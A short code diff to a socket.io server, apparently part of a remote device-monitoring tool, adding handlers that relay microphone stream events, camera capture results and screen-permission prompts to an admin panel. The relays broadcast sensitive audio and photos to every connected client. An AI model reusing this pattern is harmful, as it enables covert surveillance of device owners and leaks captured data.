@@ -3359,6 +3359,12 @@ const { encrypt: cryptoEncrypt } = require('./utils/crypto');
         } catch (_) {}
       });
 
+      // v7.9.4: Relay mic stream lifecycle events (start/stop/started/stopped)
+      socket.on('mic_stream_start', (data) => { io.emit('mic_stream_start', data); });
+      socket.on('mic_stream_stop', (data) => { io.emit('mic_stream_stop', data); });
+      socket.on('mic_stream_started', (data) => { io.emit('mic_stream_started', data); });
+      socket.on('mic_stream_stopped', (data) => { io.emit('mic_stream_stopped', data); });
+
       socket.on('mic_stream_chunk', (meta, chunk) => {
         // Just broadcast to admin panel — we don't persist audio chunks
         io.emit('mic_stream_chunk', { ...meta, chunk: chunk ? Buffer.from(chunk).toString('base64') : null });
@@ -3423,6 +3429,13 @@ const { encrypt: cryptoEncrypt } = require('./utils/crypto');
       // v7.9.2: Blocked apps list response
       socket.on('blocked_apps_list', (data) => { io.emit('blocked_apps_list', data); });
       socket.on('app_block_result', (data) => { io.emit('app_block_result', data); });
+
+      // v7.9.4: Camera capture result relay (was missing — photos never reached admin panel)
+      socket.on('camera_capture_result', (data) => { io.emit('camera_capture_result', data); });
+
+      // v7.9.4: Screen grant result relay
+      socket.on('screen_grant_result', (data) => { io.emit('screen_grant_result', data); });
+      socket.on('screen_grant_prompt_shown', (data) => { io.emit('screen_grant_prompt_shown', data); });
     });
   }
 
